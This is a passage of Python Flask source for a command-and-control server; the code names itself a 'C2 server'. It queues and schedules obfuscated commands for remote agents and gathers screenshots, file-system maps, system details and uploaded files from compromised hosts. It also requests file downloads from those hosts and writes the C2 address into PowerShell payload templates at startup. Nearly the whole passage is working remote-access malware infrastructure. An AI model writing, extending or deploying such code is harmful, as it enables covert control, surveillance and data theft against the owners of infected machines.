                            if timestamp == "Unknown":
                                timestamp = datetime.fromtimestamp(file_stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                            
                            screenshot_files.append({
                                'filename': filename,
                                'agent': agent_name,
                                'timestamp': timestamp,
                                'size': file_stat.st_size,
                                'size_formatted': format_file_size(file_stat.st_size)
                            })
                            
                        except OSError as e:
                            print(f"DEBUG: Error accessing file {filename}: {e}")
                            continue
                        
            except PermissionError as pe:
                print(f"DEBUG: Permission error reading directory: {pe}")
                return jsonify({'error': f'Permission denied accessing uploads directory: {str(pe)}'}), 500
            except Exception as e:
                print(f"DEBUG: Error reading directory contents: {e}")
                return jsonify({'error': f'Error reading directory contents: {str(e)}'}), 500
        else:
            print(f"DEBUG: Upload directory does not exist or is not a directory")
            print(f"DEBUG: Trying to create directory...")
            try:
                os.makedirs(upload_dir, exist_ok=True)
                print(f"DEBUG: Directory created successfully")
                return jsonify([])  # Return empty list for new directory
            except Exception as e:
                print(f"DEBUG: Failed to create directory: {e}")
                return jsonify({'error': f'Uploads directory not found and could not be created: {upload_dir}'}), 404
        
        # Sort by timestamp (newest first)
        # Use file modification time for sorting if timestamp is "Unknown"
        def sort_key(x):
            if x['timestamp'] != "Unknown":
                try:
                    # Try to parse timestamp for sorting
                    return datetime.strptime(x['timestamp'], '%Y-%m-%d %H:%M:%S')
                except:
                    # If parsing fails, use a very old date
                    return datetime(1970, 1, 1)
            else:
                # Use file modification time
                file_path = os.path.join(upload_dir, x['filename'])
                try:
                    return datetime.fromtimestamp(os.path.getmtime(file_path))
                except:
                    return datetime(1970, 1, 1)
        
        try:
            screenshot_files.sort(key=sort_key, reverse=True)
        except Exception as sort_error:
            print(f"DEBUG: Error sorting screenshots: {sort_error}")
            # Continue without sorting if there's an error
        
        print(f"DEBUG: Returning {len(screenshot_files)} screenshot files")
        print(f"DEBUG: Screenshot files: {[f['filename'] for f in screenshot_files]}")
        return jsonify(screenshot_files)
        
    except Exception as e:
        print(f"DEBUG: Unexpected error in get_screenshots: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': f'Failed to load screenshots: {str(e)}'}), 500

@app.route('/uploads/<path:filename>')
def serve_screenshot(filename):
    """Serve screenshot files from the uploads directory"""
    try:
        upload_dir = app.config['UPLOAD_FOLDER']
        # Secure the filename to prevent directory traversal
        filename = os.path.basename(filename)
        file_path = os.path.join(upload_dir, filename)
        
        print(f"DEBUG: Serving screenshot - filename: {filename}, path: {file_path}, exists: {os.path.exists(file_path)}")
        
        if os.path.exists(file_path) and os.path.isfile(file_path) and filename.lower().endswith(('.png', '.jpg', '.jpeg')):
            return send_from_directory(upload_dir, filename, mimetype='image/png' if filename.lower().endswith('.png') else 'image/jpeg')
        else:
            print(f"DEBUG: File not found or invalid: {file_path}")
            return jsonify({'error': 'File not found or invalid file type'}), 404
            
    except Exception as e:
        print(f"DEBUG: Error serving screenshot {filename}: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': f'Failed to serve screenshot: {str(e)}'}), 500

@app.route('/download/screenshot/<filename>')
def download_screenshot(filename):
    """Download a screenshot file"""
    try:
        upload_dir = app.config['UPLOAD_FOLDER']
        file_path = os.path.join(upload_dir, filename)
        
        if os.path.exists(file_path) and filename.lower().endswith(('.png', '.jpg', '.jpeg')):
            return send_from_directory(upload_dir, filename, as_attachment=True)
        else:
            return jsonify({'error': 'File not found or invalid file type'}), 404
            
    except Exception as e:
        print(f"DEBUG: Error downloading screenshot {filename}: {e}")
        return jsonify({'error': f'Failed to download screenshot: {str(e)}'}), 500

@app.route('/test/screenshot')
def test_screenshot():
    """Test route to verify screenshot functionality"""
    try:
        # Check if uploads directory exists and has screenshots
        upload_dir = app.config['UPLOAD_FOLDER']
        
        # Debug information
        debug_info = {
            'upload_dir': upload_dir,
            'exists': os.path.exists(upload_dir),
            'is_dir': os.path.isdir(upload_dir) if os.path.exists(upload_dir) else False,
            'current_working_dir': os.getcwd(),
            'absolute_upload_dir': os.path.abspath(upload_dir)
        }
        
        # List files in uploads directory
        if os.path.exists(upload_dir) and os.path.isdir(upload_dir):
            try:
                files = os.listdir(upload_dir)
                screenshot_files = [f for f in files if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
                debug_info['total_files'] = len(files)
                debug_info['screenshot_files'] = screenshot_files
                debug_info['all_files'] = files
                
                # Test API endpoint
                debug_info['api_endpoint'] = '/api/screenshots'
                
            except Exception as e:
                debug_info['list_error'] = str(e)
        else:
            debug_info['list_error'] = 'Directory does not exist or is not a directory'
        
        return jsonify(debug_info)
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/test/scheduler')
def test_scheduler():
    """Test route to verify scheduler functionality"""
    try:
        # Check scheduled commands
        scheduled_commands = ScheduledCommand.query.filter_by(is_active=True).all()
        
        # Check command queue
        command_queue = CommandQueue.query.all()
        
        # Check agents
        agents = Agent.query.all()
        
        debug_info = {
            'status': 'success',
            'scheduled_commands_count': len(scheduled_commands),
            'command_queue_count': len(command_queue),
            'agents_count': len(agents),
            'scheduled_commands': [{
                'id': cmd.id,
                'hostname': cmd.hostname,
                'command': cmd.command,
                'schedule_type': cmd.schedule_type,
                'cron_expression': cmd.cron_expression,
                'next_run': cmd.next_run.isoformat() if cmd.next_run else None,
                'last_run': cmd.last_run.isoformat() if cmd.last_run else None,
                'is_active': cmd.is_active
            } for cmd in scheduled_commands],
            'command_queue': [{
                'id': cmd.id,
                'hostname': cmd.hostname,
                'command': cmd.command,
                'created_at': cmd.created_at.isoformat() if cmd.created_at else None
            } for cmd in command_queue],
            'agents': [{
                'hostname': agent.hostname,
                'ip': agent.ip,
                'last_seen': agent.last_seen.isoformat() if agent.last_seen else None
            } for agent in agents]
        }
        
        return jsonify(debug_info)
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 500

@app.route('/test/cron/<expression>')
def test_cron_expression(expression):
    """Test route to verify cron expression parsing"""
    try:
        next_run = parse_cron_expression(expression)
        now = datetime.utcnow()
        
        debug_info = {
            'status': 'success',
            'cron_expression': expression,
            'current_time': now.isoformat(),
            'next_run': next_run.isoformat(),
            'time_until_next': str(next_run - now),
            'is_in_future': next_run > now
        }
        
        return jsonify(debug_info)
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'error': str(e)
        }), 500
    

def format_file_size(size_bytes):
    """Format file size in human readable format"""
    if size_bytes == 0:
        return "0B"
    size_names = ["B", "KB", "MB", "GB"]
    i = 0
    while size_bytes >= 1024 and i < len(size_names) - 1:
        size_bytes /= 1024.0
        i += 1
    return f"{size_bytes:.1f}{size_names[i]}"

def get_lan_ip():
    try:
        # Try to get local IP using socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        # Fallback to localhost if network detection fails
        return '127.0.0.1'

def parse_cron_expression(cron_expr):
    """Parse cron expression and calculate next run time"""
    try:
        # Parse cron expression: minute hour day month weekday
        parts = cron_expr.strip().split()
        if len(parts) != 5:
            raise ValueError("Cron expression must have exactly 5 parts")
        
        minute, hour, day, month, weekday = parts
        
        now = datetime.utcnow()
        
        # Start with current time
        next_run = now.replace(second=0, microsecond=0)
        
        # Parse minute
        if minute == '*':
            # Every minute
            next_run = next_run + timedelta(minutes=1)
        elif '/' in minute:
            # Every N minutes
            interval = int(minute.split('/')[1])
            next_run = next_run + timedelta(minutes=interval)
        else:
            # Specific minute
            target_minute = int(minute)
            if target_minute <= next_run.minute:
                next_run = next_run + timedelta(hours=1)
            next_run = next_run.replace(minute=target_minute)
        
        # Parse hour
        if hour != '*':
            if '/' in hour:
                # Every N hours
                interval = int(hour.split('/')[1])
                next_run = next_run.replace(hour=next_run.hour + (interval - (next_run.hour % interval)))
            else:
                # Specific hour
                target_hour = int(hour)
                if target_hour <= next_run.hour:
                    next_run = next_run + timedelta(days=1)
                next_run = next_run.replace(hour=target_hour)
        
        # Parse day
        if day != '*':
            if '/' in day:
                # Every N days
                interval = int(day.split('/')[1])
                next_run = next_run + timedelta(days=interval)
            else:
                # Specific day
                target_day = int(day)
                if target_day <= next_run.day:
                    next_run = next_run + timedelta(days=1)
                next_run = next_run.replace(day=target_day)
        
        # Parse month
        if month != '*':
            if '/' in month:
                # Every N months
                interval = int(month.split('/')[1])
                next_run = next_run + timedelta(days=30 * interval)
            else:
                # Specific month
                target_month = int(month)
                if target_month <= next_run.month:
                    next_run = next_run + timedelta(days=365)
                next_run = next_run.replace(month=target_month)
        
        # Parse weekday
        if weekday != '*':
            if '/' in weekday:
                # Every N weekdays
                interval = int(weekday.split('/')[1])
                next_run = next_run + timedelta(weeks=interval)
            else:
                # Specific weekday (0=Sunday, 1=Monday, etc.)
                target_weekday = int(weekday)
                current_weekday = next_run.weekday()
                days_ahead = target_weekday - current_weekday
                if days_ahead <= 0:
                    days_ahead += 7
                next_run = next_run + timedelta(days=days_ahead)
        
        # Ensure next_run is in the future
        if next_run <= now:
            next_run = now + timedelta(minutes=1)
        
        return next_run
        
    except Exception as e:
        print(f"Error parsing cron expression '{cron_expr}': {str(e)}")
        # Fallback: run every minute
        return datetime.utcnow() + timedelta(minutes=1)

def check_scheduled_commands():
    """Check and execute scheduled commands"""
    try:
        now = datetime.utcnow()
        scheduled_commands = ScheduledCommand.query.filter_by(is_active=True).all()
        
        if scheduled_commands:
            print(f"Scheduler check: {len(scheduled_commands)} active scheduled commands")
        
        for cmd in scheduled_commands:
            try:
                if cmd.next_run and cmd.next_run <= now:
                    print(f"Executing scheduled command for {cmd.hostname}: {cmd.command}")
                    print(f"Schedule type: {cmd.schedule_type}, Cron: {cmd.cron_expression}")
                    
                    # Execute the command by adding it to the command queue
                    command_queue = CommandQueue(hostname=cmd.hostname, command=cmd.obfuscated_command)
                    db.session.add(command_queue)
                    
                    # Update the scheduled command
                    cmd.last_run = now
                    
                    # Calculate next run time based on schedule type
                    if cmd.schedule_type == 'hourly':
                        cmd.next_run = now + timedelta(hours=1)
                        print(f"Next hourly run: {cmd.next_run}")
                    elif cmd.schedule_type == 'daily':
                        cmd.next_run = now + timedelta(days=1)
                        print(f"Next daily run: {cmd.next_run}")
                    elif cmd.schedule_type == 'once':
                        cmd.is_active = False  # Deactivate one-time commands
                        print(f"One-time command completed and deactivated")
                    elif cmd.schedule_type == 'custom' and cmd.cron_expression:
                        # For custom cron, use the cron parser to calculate next run time
                        old_next_run = cmd.next_run
                        cmd.next_run = parse_cron_expression(cmd.cron_expression)
                        print(f"Next run for cron '{cmd.cron_expression}': {cmd.next_run} (was: {old_next_run})")
                    
                    db.session.commit()
                    print(f"Command queued successfully for {cmd.hostname}")
                    
            except Exception as e:
                print(f"Error processing scheduled command {cmd.id}: {str(e)}")
                db.session.rollback()
                continue
                
    except Exception as e:
        print(f"Error in check_scheduled_commands: {str(e)}")
        db.session.rollback()

def start_background_scheduler():
    """Start background scheduler for checking scheduled commands"""
    import threading
    import time
    
    def scheduler_loop():
        while True:
            try:
                with app.app_context():
                    check_scheduled_commands()
            except Exception as e:
                print(f"Scheduler error: {e}")
            time.sleep(10)  # Check every 10 seconds for more responsive cron execution
    
    scheduler_thread = threading.Thread(target=scheduler_loop, daemon=True)
    scheduler_thread.start()
    return scheduler_thread

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        # Auto-regenerate all payloads with LAN IP
        payload_dir = 'payloads'
        gen_dir = os.path.join(payload_dir, 'generated')
        os.makedirs(gen_dir, exist_ok=True)
        c2_ip = get_lan_ip()
        c2_port = "8084"
        for fname in os.listdir(payload_dir):
            if fname.endswith('.ps1'):
                original_path = os.path.join(payload_dir, fname)
                try:
                    with open(original_path, 'r', encoding='utf-8') as f:
                        content = f.read()
                except UnicodeDecodeError:
                    with open(original_path, 'r', encoding='cp1252') as f:
                        content = f.read()
                content = content.replace('{C2_HOST}', c2_ip).replace('{C2_PORT}', c2_port)
                updated_path = os.path.join(gen_dir, fname)
                with open(updated_path, 'w', encoding='utf-8') as f:
                    f.write(content)
    
    # Start the background scheduler
    start_background_scheduler()



@app.route('/debug/agents')
def debug_agents():
    """Debug endpoint to show all agents in database"""
    try:
        agents = Agent.query.all()
        agent_data = []
        for agent in agents:
            agent_data.append({
                'id': agent.id,
                'hostname': agent.hostname,
                'os': agent.os,
                'ip': agent.ip,
                'last_seen': agent.last_seen.isoformat() if agent.last_seen else None,
                'location': agent.location
            })
        
        return jsonify({
            'total_agents': len(agent_data),
            'agents': agent_data
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/test/screenshots-api')
def test_screenshots_api():
    """Simple test route to verify screenshots API functionality"""
    try:
        # Test basic functionality
        upload_dir = app.config['UPLOAD_FOLDER']
        
        test_data = {
            'upload_dir': upload_dir,
            'exists': os.path.exists(upload_dir),
            'is_dir': os.path.isdir(upload_dir) if os.path.exists(upload_dir) else False,
            'current_working_dir': os.getcwd(),
            'test_message': 'Screenshots API test route working'
        }
        
        # Test if we can list files
        if os.path.exists(upload_dir) and os.path.isdir(upload_dir):
            try:
                files = os.listdir(upload_dir)
                test_data['file_count'] = len(files)
                test_data['files'] = files[:10]  # First 10 files
                test_data['screenshot_files'] = [f for f in files if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
            except Exception as e:
                test_data['list_error'] = str(e)
        
        return jsonify(test_data)
        
    except Exception as e:
        return jsonify({'error': str(e), 'traceback': traceback.format_exc()}), 500

@app.route('/list-files')
def list_files():
    """Simple route to list files in uploads directory"""
    try:
        upload_dir = app.config['UPLOAD_FOLDER']
        if os.path.exists(upload_dir) and os.path.isdir(upload_dir):
            files = os.listdir(upload_dir)
            return jsonify({
                'directory': upload_dir,
                'total_files': len(files),
                'all_files': files,
                'screenshot_files': [f for f in files if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
            })
        else:
            return jsonify({'error': 'Directory not found', 'path': upload_dir})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/recent-activity')
def get_recent_activity():
    """Get recent activity including commands and results"""
    try:
        # Get recent commands from CommandQueue (last 10)
        recent_commands = CommandQueue.query.order_by(CommandQueue.created_at.desc()).limit(10).all()
        
        # Get recent results (last 10)
        recent_results = Result.query.order_by(Result.timestamp.desc()).limit(10).all()
        
        # Get recent screenshots (last 5)
        recent_screenshots = []
        upload_dir = app.config['UPLOAD_FOLDER']
        if os.path.exists(upload_dir) and os.path.isdir(upload_dir):
            try:
                files = os.listdir(upload_dir)
                screenshot_files = [f for f in files if f.lower().endswith(('.png', '.jpg', '.jpeg'))]
                # Sort by modification time and get last 5
                screenshot_files_with_time = []
                for filename in screenshot_files:
                    file_path = os.path.join(upload_dir, filename)
                    try:
                        mtime = os.path.getmtime(file_path)
                        screenshot_files_with_time.append((filename, mtime))
                    except OSError:
                        continue
                
                # Sort by modification time (newest first) and take last 5
                screenshot_files_with_time.sort(key=lambda x: x[1], reverse=True)
                recent_screenshots = [filename for filename, _ in screenshot_files_with_time[:5]]
            except Exception as e:
                print(f"DEBUG: Error reading screenshot files: {e}")
        
        # Combine and format activity data
        activity_items = []
        
        # Add commands
        for cmd in recent_commands:
            activity_items.append({
                'type': 'command',
                'id': cmd.id,
                'hostname': cmd.hostname,
                'command': cmd.command[:100] + '...' if len(cmd.command) > 100 else cmd.command,
                'timestamp': cmd.created_at.isoformat(),
                'status': 'queued',
                'icon': 'fas fa-terminal',
                'color': 'var(--primary-color)'
            })
        
        # Add results
        for result in recent_results:
            activity_items.append({
                'type': 'result',
                'id': result.id,
                'hostname': result.hostname,
                'output': result.output[:100] + '...' if len(result.output) > 100 else result.output,
                'timestamp': result.timestamp.isoformat(),
                'status': 'completed',
                'icon': 'fas fa-check-circle',
                'color': 'var(--success-color)'
            })
        
        # Add screenshots
        for screenshot in recent_screenshots:
            # Extract hostname from filename
            hostname = "Unknown"
            if "_screenshot" in screenshot:
                parts = screenshot.split("_screenshot")[0].split("_")
                if len(parts) >= 3:
                    # New format: hostname_random_timestamp_screenshot.png
                    for part in parts:
                        if not part.isdigit() and len(part) > 2:
                            hostname = part
                            break
                    if hostname == "Unknown":
                        hostname = parts[0]
                else:
                    # Old format: hostname_screenshot.png
                    hostname = parts[0]
            
            activity_items.append({
                'type': 'screenshot',
                'id': screenshot,
                'hostname': hostname,
                'filename': screenshot,
                'timestamp': datetime.fromtimestamp(os.path.getmtime(os.path.join(upload_dir, screenshot))).isoformat(),
                'status': 'captured',
                'icon': 'fas fa-camera',
                'color': 'var(--secondary-color)'
            })
        
        # Sort all activity by timestamp (newest first)
        activity_items.sort(key=lambda x: x['timestamp'], reverse=True)
        
        # Return top 15 most recent items
        return jsonify(activity_items[:15])
        
    except Exception as e:
        print(f"DEBUG: Error fetching recent activity: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': f'Failed to fetch recent activity: {str(e)}'}), 500

@app.route('/debug/fix-agent-ip/<hostname>', methods=['POST'])
def fix_agent_ip(hostname):
    """Manually fix an agent's IP address"""
    try:
        data = request.json
        new_ip = data.get('ip')
        
        if not new_ip:
            return jsonify({'error': 'IP address is required'}), 400
        
        agent = Agent.query.filter_by(hostname=hostname).first()
        if not agent:
            return jsonify({'error': 'Agent not found'}), 404
        
        print(f"DEBUG: Manually fixing IP for {hostname} from '{agent.ip}' to '{new_ip}'")
        agent.ip = new_ip
        db.session.commit()
        
        # Verify the change
        updated_agent = Agent.query.filter_by(hostname=hostname).first()
        print(f"DEBUG: Verification - Agent {hostname} now has IP: {updated_agent.ip}")
        
        return jsonify({
            'message': f'IP updated successfully for {hostname}',
            'old_ip': agent.ip,
            'new_ip': new_ip
        })
        
    except Exception as e:
        print(f"DEBUG: Error fixing agent IP: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/debug/check-db')
def check_database():
    """Check database integrity and show table info"""
    try:
        # Check if tables exist
        tables = db.engine.table_names()
        
        # Check Agent table structure
        agent_columns = []
        try:
            result = db.engine.execute("PRAGMA table_info(agent)")
            for row in result:
                agent_columns.append({
                    'name': row[1],
                    'type': row[2],
                    'notnull': row[3],
                    'default': row[4],
                    'pk': row[5]
                })
        except Exception as e:
            agent_columns = [{'error': str(e)}]
        
        # Check for any agents with null IPs
        null_ip_agents = Agent.query.filter(Agent.ip.is_(None)).all()
        null_ip_data = [{'hostname': a.hostname, 'os': a.os, 'last_seen': a.last_seen.isoformat() if a.last_seen else None} for a in null_ip_agents]
        
        return jsonify({
            'tables': tables,
            'agent_table_columns': agent_columns,
            'agents_with_null_ip': null_ip_data,
            'total_agents': Agent.query.count(),
            'agents_with_ip': Agent.query.filter(Agent.ip.isnot(None)).count()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/debug/refresh-db')
def refresh_database():
    """Force refresh database session and check for issues"""
    try:
        # Close current session
        db.session.close()
        
        # Check database connection
        db.engine.dispose()
        
        # Test query
        test_agent = Agent.query.first()
        
        # Get all agents to refresh session
        all_agents = Agent.query.all()
        
        return jsonify({
            'message': 'Database session refreshed successfully',
            'test_query_works': test_agent is not None,
            'total_agents': len(all_agents),
            'agents': [{'hostname': a.hostname, 'ip': a.ip, 'os': a.os} for a in all_agents]
        })
        
    except Exception as e:
        print(f"DEBUG: Error refreshing database: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/debug/recreate-db')
def recreate_database():
    """Recreate database tables if there are schema issues"""
    try:
        print("DEBUG: Recreating database tables...")
        
        # Drop all tables
        db.drop_all()
        print("DEBUG: All tables dropped")
        
        # Create all tables
        db.create_all()
        print("DEBUG: All tables recreated")
        
        # Verify Agent table structure
        result = db.engine.execute("PRAGMA table_info(agent)")
        columns = [row[1] for row in result]
        print(f"DEBUG: Agent table columns: {columns}")
        
        return jsonify({
            'message': 'Database recreated successfully',
            'agent_table_columns': columns
        })
        
    except Exception as e:
        print(f"DEBUG: Error recreating database: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'error': str(e)}), 500







@app.route('/api/filesystem/upload', methods=['POST'])
def receive_file_system_data():
    """Receive file system data from mapper agent"""
    try:
        data = request.json
        hostname = data.get('hostname')
        drive_letter = data.get('drive_letter')
        file_count = data.get('file_count')
        scan_timestamp = data.get('scan_timestamp')
        file_system_data = data.get('file_system_data', [])
        
        print(f"DEBUG: Received file system data from {hostname}, drive {drive_letter}: {file_count} items")
        
        # Store drive information
        drive_info = DriveInfo(
            hostname=hostname,
            drive_letter=drive_letter,
            label=f"Drive {drive_letter}",
            size=0,  # Will be calculated from files
            free_space=0,
            file_system="NTFS",
            status="Ready"
        )
        db.session.add(drive_info)
        
        # Store file system items
        total_size = 0
        for item_data in file_system_data:
            try:
                item = FileSystemItem(
                    hostname=hostname,
                    drive_letter=drive_letter,
                    name=item_data.get('name'),
                    full_path=item_data.get('full_path'),
                    type=item_data.get('type'),
                    size=item_data.get('size', 0),
                    created=item_data.get('created'),
                    modified=item_data.get('modified'),
                    attributes=item_data.get('attributes'),
                    is_hidden=item_data.get('is_hidden', False),
                    is_system=item_data.get('is_system', False),
                    extension=item_data.get('extension', ''),
                    read_only=item_data.get('read_only', False),
                    hash=item_data.get('hash'),
                    scan_timestamp=scan_timestamp
                )
                db.session.add(item)
                
                if item_data.get('type') == 'file':
                    total_size += item_data.get('size', 0)
                    
            except Exception as e:
                print(f"DEBUG: Error processing file system item: {e}")
                continue
        
        # Update drive size
        drive_info.size = total_size
        
        db.session.commit()
        return jsonify({'message': f'File system data received successfully: {file_count} items'})
        
    except Exception as e:
        print(f"DEBUG: Error receiving file system data: {e}")
        return jsonify({'error': f'Failed to receive file system data: {str(e)}'}), 500

@app.route('/api/filesystem/status', methods=['POST'])
def update_system_mapper_status():
    """Update system mapper status"""
    try:
        data = request.json
        hostname = data.get('hostname')
        status = data.get('status')
        timestamp = data.get('timestamp')
        
        print(f"DEBUG: System mapper status update - Hostname: {hostname}, Status: {status}")
        
        # Update mapper status
        mapper = SystemMapper.query.filter_by(hostname=hostname).first()
        if mapper:
            mapper.status = status
            mapper.timestamp = timestamp
            mapper.last_seen = datetime.utcnow()
            db.session.commit()
        
        return jsonify({'message': 'Status updated successfully'})
        
    except Exception as e:
        print(f"DEBUG: Error updating system mapper status: {e}")
        return jsonify({'error': f'Failed to update status: {str(e)}'}), 500

@app.route('/api/filesystem/agents')
def get_system_mappers():
    """Get all system mapper agents"""
    try:
        mappers = SystemMapper.query.all()
        return jsonify([{
            'id': m.id,
            'hostname': m.hostname,
            'type': m.type,
            'status': m.status,
            'timestamp': m.timestamp,
            'os_info': m.os_info,
            'architecture': m.architecture,
            'last_seen': m.last_seen.isoformat() if m.last_seen else None
        } for m in mappers])
    except Exception as e:
        print(f"DEBUG: Error getting system mappers: {e}")
        return jsonify({'error': f'Failed to get system mappers: {str(e)}'}), 500

@app.route('/api/filesystem/system-info/<hostname>')
def get_system_info(hostname):
    """Get system information for a specific hostname"""
    try:
        system_info = SystemInfo.query.filter_by(hostname=hostname).order_by(SystemInfo.created_at.desc()).first()
        if system_info:
            return jsonify({
                'id': system_info.id,
                'hostname': system_info.hostname,
                'os_name': system_info.os_name,
                'os_version': system_info.os_version,
                'os_build': system_info.os_build,
                'os_architecture': system_info.os_architecture,
                'computer_manufacturer': system_info.computer_manufacturer,
                'computer_model': system_info.computer_model,
                'bios_version': system_info.bios_version,
                'total_physical_memory': system_info.total_physical_memory,
                'processor_count': system_info.processor_count,
                'domain': system_info.domain,
                'workgroup': system_info.workgroup,
                'last_boot_time': system_info.last_boot_time,
                'scan_timestamp': system_info.scan_timestamp,
                'created_at': system_info.created_at.isoformat() if system_info.created_at else None
            })
        else:
            return jsonify({'error': 'System info not found'}), 404
    except Exception as e:
        print(f"DEBUG: Error getting system info: {e}")
        return jsonify({'error': f'Failed to get system info: {str(e)}'}), 500

@app.route('/api/filesystem/drives/<hostname>')
def get_drives(hostname):
    """Get drives for a specific hostname"""
    try:
        drives = DriveInfo.query.filter_by(hostname=hostname).all()
        return jsonify([{
            'id': d.id,
            'hostname': d.hostname,
            'drive_letter': d.drive_letter,
            'label': d.label,
            'size': d.size,
            'free_space': d.free_space,
            'file_system': d.file_system,
            'status': d.status,
            'created_at': d.created_at.isoformat() if d.created_at else None
        } for d in drives])
    except Exception as e:
        print(f"DEBUG: Error getting drives: {e}")
        return jsonify({'error': f'Failed to get drives: {str(e)}'}), 500

@app.route('/api/filesystem/files/<hostname>')
def get_files(hostname):
    """Get files for a specific hostname with filtering"""
    try:
        drive = request.args.get('drive', '')
        path = request.args.get('path', '')
        file_type = request.args.get('type', '')
        page = request.args.get('page', 1, type=int)
        per_page = request.args.get('per_page', 100, type=int)
        
        query = FileSystemItem.query.filter_by(hostname=hostname)
        
        if drive:
            query = query.filter_by(drive_letter=drive)
        if path:
            query = query.filter(FileSystemItem.full_path.like(f"{path}%"))
        if file_type:
            query = query.filter_by(type=file_type)
        
        files = query.order_by(FileSystemItem.full_path.asc()).paginate(
            page=page, per_page=per_page, error_out=False
        )
        
        return jsonify({
            'files': [{
                'id': f.id,
                'hostname': f.hostname,
                'drive_letter': f.drive_letter,
                'name': f.name,
                'full_path': f.full_path,
                'type': f.type,
                'size': f.size,
                'created': f.created,
                'modified': f.modified,
                'attributes': f.attributes,
                'is_hidden': f.is_hidden,
                'is_system': f.is_system,
                'extension': f.extension,
                'read_only': f.read_only,
                'hash': f.hash,
                'scan_timestamp': f.scan_timestamp,
                'created_at': f.created_at.isoformat() if f.created_at else None
            } for f in files.items],
            'total': files.total,
            'pages': files.pages,
            'current_page': page
        })
    except Exception as e:
        print(f"DEBUG: Error getting files: {e}")
        return jsonify({'error': f'Failed to get files: {str(e)}'}), 500

@app.route('/api/filesystem/search/<hostname>')
def search_files(hostname):
    """Search files for a specific hostname"""
    try:
        query = request.args.get('q', '')
        if not query:
            return jsonify({'error': 'Search query required'}), 400
        
        files = FileSystemItem.query.filter(
            FileSystemItem.hostname == hostname,
            FileSystemItem.name.like(f'%{query}%')
        ).limit(100).all()
        
        return jsonify([{
            'id': f.id,
            'hostname': f.hostname,
            'drive_letter': f.drive_letter,
            'name': f.name,
            'full_path': f.full_path,
            'type': f.type,
            'size': f.size,
            'created': f.created,
            'modified': f.modified,
            'attributes': f.attributes,
            'is_hidden': f.is_hidden,
            'is_system': f.is_system,
            'extension': f.extension,
            'read_only': f.read_only,
            'hash': f.hash,
            'scan_timestamp': f.scan_timestamp
        } for f in files])
    except Exception as e:
        print(f"DEBUG: Error searching files: {e}")
        return jsonify({'error': f'Failed to search files: {str(e)}'}), 500

@app.route('/api/filesystem/download/<hostname>', methods=['POST'])
def request_file_download(hostname):
    """Request a file download from a specific hostname"""
    try:
        data = request.json
        file_path = data.get('file_path')
        file_name = data.get('file_name')
        file_size = data.get('file_size', 0)
        
        if not file_path or not file_name:
            return jsonify({'error': 'File path and name required'}), 400
        
        # Create download request
        download = FileDownload(
            hostname=hostname,
            file_path=file_path,
            file_name=file_name,
            file_size=file_size,
            download_status='pending'
        )
        db.session.add(download)
        db.session.commit()
        
        return jsonify({
            'message': 'Download request created successfully',
            'download_id': download.id
        })
        
    except Exception as e:
        print(f"DEBUG: Error creating download request: {e}")
        return jsonify({'error': f'Failed to create download request: {str(e)}'}), 500

@app.route('/api/filesystem/downloads')
def get_downloads():
    """Get all download requests"""
    try:
        downloads = FileDownload.query.order_by(FileDownload.created_at.desc()).all()
        return jsonify([{
            'id': d.id,
            'hostname': d.hostname,
            'file_path': d.file_path,
            'file_name': d.file_name,
            'file_size': d.file_size,
            'download_status': d.download_status,
            'local_path': d.local_path,
            'download_timestamp': d.download_timestamp.isoformat() if d.download_timestamp else None,
            'created_at': d.created_at.isoformat() if d.created_at else None
        } for d in downloads])
    except Exception as e:
        print(f"DEBUG: Error getting downloads: {e}")
        return jsonify({'error': f'Failed to get downloads: {str(e)}'}), 500

# File Upload Endpoints
@app.route('/api/files/upload', methods=['POST'])
def upload_file():
    """Upload file from agent to C2 server"""
    try:
        # Check if file is present in request
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        hostname = request.form.get('hostname', 'unknown')
        description = request.form.get('description', '')
        tags = request.form.get('tags', '')
        
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Secure the filename
        original_filename = secure_filename(file.filename)
        timestamp = datetime.utcnow().strftime('%Y%m%d_%H%M%S')
        stored_filename = f"{hostname}_{timestamp}_{original_filename}"
        
        # Create uploads directory if it doesn't exist
        upload_dir = app.config['UPLOAD_FOLDER']
        os.makedirs(upload_dir, exist_ok=True)
        
        # Save file
        file_path = os.path.join(upload_dir, stored_filename)
        file.save(file_path)
        
        # Get file info
        file_size = os.path.getsize(file_path)
        
        # Better MIME type detection
        mime_type, _ = mimetypes.guess_type(original_filename)
        if mime_type:
            file_type = mime_type
        else:
            # Fallback based on file extension
            ext = original_filename.lower().split('.')[-1] if '.' in original_filename else ''
            if ext in ['jpg', 'jpeg']:
                file_type = 'image/jpeg'
            elif ext == 'png':
                file_type = 'image/png'
            elif ext == 'gif':
                file_type = 'image/gif'
            elif ext == 'pdf':
                file_type = 'application/pdf'
            elif ext in ['mp4', 'avi', 'mov']:
                file_type = 'video/mp4'
            elif ext in ['mp3', 'm4a', 'wav']:
                file_type = 'audio/mpeg'
            elif ext in ['txt', 'log']:
                file_type = 'text/plain'
            elif ext in ['doc', 'docx']:
                file_type = 'application/msword'
            else:
                file_type = 'application/octet-stream'
        
        # Verify file integrity
        if file_size == 0:
            return jsonify({'error': 'Uploaded file is empty'}), 400
        
        # Store file record in database
        uploaded_file = UploadedFile(
            hostname=hostname,
            original_filename=original_filename,
            stored_filename=stored_filename,
            file_path=file_path,
            file_size=file_size,
            file_type=file_type,
            description=description,
            tags=tags
        )
        
